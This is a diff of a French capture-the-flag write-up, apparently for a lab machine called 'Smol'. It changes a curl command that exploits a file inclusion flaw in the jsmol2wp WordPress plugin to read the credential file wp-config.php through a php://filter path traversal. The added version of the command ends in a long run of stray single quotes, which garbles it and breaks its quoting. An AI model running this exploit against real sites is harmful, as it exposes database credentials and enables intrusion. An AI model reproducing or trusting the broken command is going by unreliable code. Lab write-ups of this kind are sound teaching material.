@@ -89,7 +89,7 @@ Exploitation de cette vulnérabilité
 Nous allons exploiter cette vulnérabilité LFI pour lire les fichiers de configuration wp-config.php 
 
 ```
-curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php'
+curl 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 
 ```
 
